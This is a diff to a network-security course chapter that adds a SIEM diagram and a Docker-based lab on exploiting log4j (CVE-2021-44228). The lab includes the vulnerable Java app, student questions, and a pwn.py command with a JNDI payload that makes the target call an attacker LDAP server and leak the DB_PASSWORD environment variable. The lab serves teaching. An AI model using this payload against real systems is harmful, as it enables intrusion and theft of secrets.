@@ -73,7 +73,9 @@ Many products are available for handling network traffic.
 They are typically marketed as either stand-alone devices, software to install on internal devices, or a subscription service that routes traffic through an external appliance.
 In the age of cloud computing network security as a service is becoming increasingly popular.
 
-=== Proxies
+=== Firewall
+
+=== Proxy
 
 [svgbob, tls-proxy, float=right]
 ....
@@ -109,7 +111,7 @@ Reverse proxies can utilize caching and validate requests as well.
 A reverse proxy can also be configured to work with a firewall.
 Whereas it used to be common practice to place a server in a demilitarized zone (DMZ) outside of a firewall, it is now far more common to employ a reverse proxy to reach that server. 
 
-=== Load Balancers
+=== Load Balancer
 
 A common application for reverse proxies is to act as a load balancer for traffic.
 Load balancers distribute work, in the form of external client requests, among the internal resources, typically servers.
@@ -118,7 +120,7 @@ For example, if a company has four servers supporting a web application, they ma
 Different metrics are used to determine how the servers are utilized including least used (round robin), weighted, least amount of active connections.
 Load balancers optimize bandwidth and increase availability.
 
-=== VPNs
+=== VPN
 
 A virtual private network (VPN) is used to encrypt internet traffic between two networks or a client and a network.
 VPNs have become standard procedure for linking remote offices or connecting remote workers.
@@ -189,3 +191,173 @@ DMARC answers questions like, "What should I do if a message is from a valid SPF
 DMARC puts many of the tools used to verify email together in a layered approach to determine whether to pass, quarantine, or block an email.
 
 == SEIM
+
+[source, svgbob, seim, align=right]
+....
+           Firewalls ----+  +---- Servers
+                         |  |
+                         V  V
+                .--------------------.
+                | +----------------+ |
+Workstations -->| | [S]ecurity and | |<-- Switches
+                | | [I]nformation  | |
+                | | [E]vent        | |
+     Routers -->| | [M]anagement   | |<-- Proxies
+                | +----------------+ |
+                '--------------------'
+                         ^  ^
+                         |  |
+                 IPS ----+  +---- DMARC
+....
+
+== Lab: Exploiting log4j
+
+In this lab we will examine the log4j vulnerability, https://nvd.nist.gov/vuln/detail/CVE-2021-44228[CVE-2021-44228].
+This vulnerability takes advantage of a flaw in a common logging library used by many Java applications, including Apache, neo4j, Steam, iCloud, and Minecraft. 
+Any attacker that can cause a message to be logged can use the Java Naming and Directory Interface (JNDI) and cause the target to reach out to another server, LDAP in our example, and load a remote Java class file.
+This file can contain any code that the attacker wishes to inject into the server process.
+
+[IMPORTANT.deliverable]
+====
+Do some research: What versions of log4j are affected by this vulnerability?
+====
+
+This lab uses a Docker Compose configuration to simulate a network with an attacker and a target.
+The target runs a https://github.com/leonjza/log4jpwn[known-vulnerable, example application] written by leonjza.
+This example application logs the `User-Agent` header, request path, and a query string parameter of a request as seen below:
+
+.App.java
+[source, java]
+----
+package com.sensepost.log4jpwn;
+
+import org.apache.logging.log4j.Logger;
+import org.apache.logging.log4j.LogManager;
+
+import static spark.Spark.*;
+
+public class App {
+    static final Logger logger = LogManager.getLogger(App.class.getName());
+
+    public static void main(String[] args) {
+
+        port(8080);
+
+        get("/*", (req, res) -> {
+
+            String ua = req.headers("User-Agent");
+            String pwn = req.queryParams("pwn");
+            String pth = req.pathInfo();
+
+            System.out.println("logging ua: " + ua);
+            System.out.println("logging pwn: " + pwn);
+            System.out.println("logging pth: " + pth);
+
+            // trigger
+            logger.error(ua);
+            logger.error(pwn);
+            logger.error(pth);
+
+            return "ok: ua: " + ua + " " + "pwn: " + pwn + " pth:" + pth;
+        });
+    }
+}
+----
+
+[IMPORTANT.deliverable]
+====
+What port does our vulnerable app run on? 
+====
+
+Our attacker container has https://github.com/leonjza/log4jpwn/blob/master/pwn.py[the `pwn.py` script], also by leonjza, which does two things:
+
+. Runs a fake LDAP server in the background on port 8888
+. Sends a request with the JNDI URI referencing the fake LDAP server asking for a Java value to leak
+. Parses and prints the response
+
+Using this setup we can show how log4j can be used to leak sensitive information from running processes.
+We will use it to leak the value of the environment variable `DB_PASSWORD`.
+As it isn't uncommon to store secrets in environment variables on running containers, this should suffice to see just how devastating this exploit can be.
+
+Start by downloading https://github.com/rxt1077/it230/blob/main/labs/log4j.zip?raw=true[the zip archive of this lab] and unzipping it in a directory where you have write permissions and can navigate to in a terminal application. Once you've done that, you can bring the lab up by typing `docker-compose up` in that directory. Output should look similar to what you see below:
+
+[source, console]
+----
+PS C:\Users\rxt1077\it230\labs\log4j> docker-compose up
+[+] Running 2/0
+ - Container log4j-target-1    Created                                                            0.0s
+ - Container log4j-attacker-1  Created                                                            0.0s
+Attaching to log4j-attacker-1, log4j-target-1
+log4j-attacker-1 exited with code 0
+log4j-target-1    | WARNING: sun.reflect.Reflection.getCallerClass is not supported. This will impact performance.
+log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.util.log - Logging initialized @815ms to org.eclipse.jetty.util.log.Slf4jLog
+log4j-target-1    | [Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - == Spark has ignited ...
+log4j-target-1    | [Thread-0] INFO spark.embeddedserver.jetty.EmbeddedJettyServer - >> Listening on 0.0.0.0:8080
+log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - jetty-9.4.z-SNAPSHOT; built: 2019-04-29T20:42:08.989Z; git: e1bc35120a6617ee3df052294e433f3a25ce7097; jvm 11.0.14+9-post-Debian-1deb11u1
+log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - DefaultSessionIdManager workerName=node0
+log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - No SessionScavenger set, using defaults
+log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.session - node0 Scavenging every 600000ms
+log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.AbstractConnector - Started ServerConnector@401fccd3{HTTP/1.1,[http/1.1]}{0.0.0.0:8080}
+log4j-target-1    | [Thread-0] INFO org.eclipse.jetty.server.Server - Started @960ms
+----
+
+You'll notice that the `target` service is up and running the `log4jpwn` example application and that its output goes straight to the screen.
+The `attacker` service will exit immediately as it is meant for interactive use and doesn't run anything in the background.
+In another terminal, navigate to the lab directory again and run `docker-compose run attacker bash`. This will be the shell that you use to attack the target:
+
+[source, console]
+----
+PS C:\Users\rxt1077\it230\labs\log4j> docker-compose run attacker bash
+root@3971c61303c8:/# <1>
+----
+<1> Notice how the prompt changes once we are in the container
+
+In the attack shell, use the `ip` command to determine the IPv4 address of your container.
+We will need this since the `attacker` container will be listening for connections from `target` once the exploit string is logged.
+
+[source, console]
+----
+root@3971c61303c8:/# ip addr show dev eth0
+58: eth0@if59: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
+    link/ether 02:42:ac:14:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
+    inet <IP_ADDRESS>/16 brd 172.20.255.255 scope global eth0 <1>
+       valid_lft forever preferred_lft forever
+----
+<1> You're IP is _not_ `<IP_ADDRESS>` it is whatever you find in its place!
+
+Once you have the IP address, you can run the `pwn.py` script on the `attacker` container and you should be able to read the `DB_PASSWORD` environment variable on the `target` container.
+
+[source, console]
+----
+root@3971c61303c8:/# python /pwn.py --listen-host <IP_ADDRESS> --exploit-host <IP_ADDRESS> --target http://target:8080 --leak '${env:DB_PASSWORD}' <1>
+ i| starting server on <IP_ADDRESS>:8888
+ i| server started
+ i| setting payload in User-Agent header
+ i| sending exploit payload ${jndi:ldap://<IP_ADDRESS>:8888/${env:DB_PASSWORD}} to http://target:8080/
+ i| new connection from <TARGETS_IP>:44050
+ v| extracted value: <DB_PASSWORD> <2>
+ i| request url was: http://target:8080/
+ i| response status code: 200
+----
+<1> Docker Compose will resolve service names to IP addresses so the target URI doesn't require finding an IP
+<2> The value of `DB_PASSWORD` can will be here.
+
+[IMPORTANT.deliverable]
+====
+What is the database password?
+====
+
+[IMPORTANT.deliverable]
+====
+What steps would you take to mitigate the risk of a deployed application having this vulnerability?
+====
+
+== Review Questions
+
+[qanda]
+What does it mean that security solutions are migrating from physical devices to cloud services? Give an example.::
+    {empty}
+In your opinion, which is more damaging, a false positive or a false negative? Why?::
+    {empty}
+What are the applications of a site-to-site VPN? Give an example of a scenario where an office might employ one.::
+    {empty}
